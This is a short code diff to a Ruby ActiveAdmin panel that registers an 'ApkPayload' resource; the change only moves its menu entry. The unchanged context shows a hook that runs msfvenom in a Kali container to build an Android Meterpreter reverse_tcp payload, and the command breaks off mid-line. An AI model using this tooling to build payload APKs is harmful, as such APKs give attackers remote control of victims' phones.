@@ -1,5 +1,6 @@
 ActiveAdmin.register ApkPayload do
-    menu priority: 1, label: "Generate APK", parent: "Actions"
+  menu priority: 3, label: "Generate APK"
+    
 
     after_create do |apk_payload|
         generateApkCommand="docker exec -u 0 kali_container sh -c \"/usr/bin/msfvenom -p android/meterpreter/reverse_tcp " \
